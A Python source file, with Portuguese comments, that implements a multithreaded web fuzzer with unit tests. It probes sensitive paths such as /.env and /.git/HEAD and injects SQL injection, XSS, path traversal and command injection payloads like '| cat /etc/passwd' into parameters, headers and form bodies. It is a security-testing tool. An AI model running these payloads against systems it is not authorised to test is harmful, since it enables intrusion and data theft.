#!/usr/bin/env python3
import requests
import random
import string
import sys
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor
import argparse
import time
import unittest
from unittest.mock import patch

class WebFuzzer:
    def __init__(self, base_url, wordlist=None, delay=0.1, threads=5):
        self.base_url = base_url
        self.wordlist = wordlist or self.default_wordlist()
        self.delay = delay
        self.threads = threads
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Fuzzer/1.0'})

    @staticmethod
    def default_wordlist():
        return [
            '/admin', '/.env', '/config.php', '/wp-login.php',
            '/.git/HEAD', '/v1/api/users', '/debug'
        ]

    def generate_payloads(self, pattern):
        """Gera payloads para diferentes tipos de ataques."""
        payloads = {
            'sqli': ["' OR 1=1 --", "' UNION SELECT null, version() --"],
            'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            'path_traversal': ["../../../../etc/passwd", ".../...//etc/passwd"],
            'command_injection': ["; ls -la", "| cat /etc/passwd"],
            'random': [''.join(random.choices(string.printable, k=50)) for _ in range(5)]
        }
        return payloads.get(pattern, [])

    def fuzz_endpoint(self, url):
        """Testa uma URL específica com diferentes payloads."""
        try:
            for attack_type in ['sqli', 'xss', 'path_traversal', 'command_injection', 'random']:
                for payload in self.generate_payloads(attack_type):
                    time.sleep(self.delay)
                    target_url = urljoin(self.base_url, url)
                    
                    # Testa em diferentes posições: parâmetros, headers e corpo (POST)
                    tests = [
                        {'params': {'q': payload}},
                        {'headers': {'X-Forwarded-For': payload}},
                        {'data': {'input': payload}}
                    ]

                    for test in tests:
                        try:
                            response = self.session.request(
                                'GET' if not test.get('data') else 'POST',
                                target_url,
                                **test,
                                timeout=5,
                                allow_redirects=False
                            )
                            
                            self.analyze_response(response, test, payload)
                            
                        except Exception as e:
                            self.results.append({
                                'url': target_url,
                                'payload': payload,
                                'error': str(e)
                            })

        except KeyboardInterrupt:
            return

    def analyze_response(self, response, test, payload):
        """Analisa a resposta para identificar vulnerabilidades."""
        indicators = {
            'sqli': ['SQL syntax', 'MySQL server version'],
            'xss': ['<script>alert(1)</script>'],
            'path_traversal': ['root:x:0:0'],
            'command_injection': ['bin', 'etc'],
            'error': ['500 Internal Server Error', 'Runtime Error']
        }

        result = {
            'url': response.url,
            'payload': payload,
            'status': response.status_code,
            'length': len(response.content),
            'type': next((k for k, v in indicators.items() if any(s in response.text for s in v)), 'unknown'),
            'injection_point': list(test.keys())[0]
        }

        if result['type'] != 'unknown' or response.status_code in [400, 500]:
            self.results.append(result)
            self.report(result)

    def report(self, result):
        """Gera um relatório formatado e colorido para cada vulnerabilidade detectada."""
        colors = {
            'sqli': '\033[91m',         # Vermelho
            'xss': '\033[93m',          # Amarelo
            'path_traversal': '\033[96m',  # Ciano
            'error': '\033[95m',        # Magenta
            'default': '\033[0m'        # Reset
        }
        
        color = colors.get(result['type'], colors['default'])
        print(f"{color}[+] Potential {result['type']} vulnerability detected!")
        print(f"    URL: {result['url']}")
        print(f"    Payload: {result['payload']}")
        print(f"    Injection Point: {result['injection_point']}")
        print(f"    Status Code: {result['status']}{colors['default']}\n")

    def start(self):
        """Inicia o processo de fuzzing em paralelo."""
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for path in self.wordlist:
                futures.append(executor.submit(self.fuzz_endpoint, path))
            
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    print(f"Error in thread: {str(e)}")

class TestWebFuzzer(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.base_url = "http://testserver"
        cls.fuzzer = WebFuzzer(cls.base_url, delay=0)
    
    def create_mock_response(self, status, text, url=None):
        mock = unittest.mock.Mock()
        mock.status_code = status
        mock.text = text
        mock.content = text.encode('utf-8')  # Conteúdo em bytes
        mock.url = url if url else self.base_url
        return mock

    @patch('requests.Session.request')
    def test_sqli_detection(self, mock_request):
        """Testa a detecção de SQL Injection."""
        mock_response = self.create_mock_response(
            500, 
            "Error: SQL syntax near '1=1'",
            url=f"{self.base_url}/search?q=%27%20OR%201=1%20--"
        )
        mock_request.return_value = mock_response

        self.fuzzer.analyze_response(mock_response, {'params': {'q': "' OR 1=1 --"}}, "' OR 1=1 --")
        self.assertEqual(self.fuzzer.results[-1]['type'], 'sqli')

    @patch('requests.Session.request')
    def test_xss_detection(self, mock_request):
        """Testa a detecção de XSS."""
        mock_response = self.create_mock_response(
            200,
            "<html><script>alert(1)</script></html>",
            url=f"{self.base_url}/profile"
        )
        mock_request.return_value = mock_response

        self.fuzzer.analyze_response(mock_response, {'headers': {'X-Header': "<script>alert"}}, "<script>alert")
        self.assertEqual(self.fuzzer.results[-1]['type'], 'xss')

def main():
    parser = argparse.ArgumentParser(description="Web Server Fuzzer")
    parser.add_argument("url", help="URL base para teste")
    parser.add_argument("-w", "--wordlist", help="Arquivo com lista de paths")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Número de threads")
    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Atraso entre requisições")
    
    args = parser.parse_args()

    if not args.url.startswith('http'):
        print("Por favor, inclua o protocolo (http/https)")
        return

    wordlist = []
    if args.wordlist:
        with open(args.wordlist) as f:
            wordlist = [line.strip() for line in f]

    fuzzer = WebFuzzer(args.url, wordlist, args.delay, args.threads)
    
    print(f"\n[+] Iniciando fuzzing em {args.url}")
    print(f"[+] Técnicas aplicadas: SQLi, XSS, Path Traversal, Command Injection")
    print(f"[!] Use com responsabilidade!\n")
    
    try:
        fuzzer.start()
    except KeyboardInterrupt:
        print("\n[!] Fuzzing interrompido pelo usuário")

if __name__ == "__main__":
    if '--test' in sys.argv:
        unittest.main(argv=sys.argv[:1])
    else:
        main()
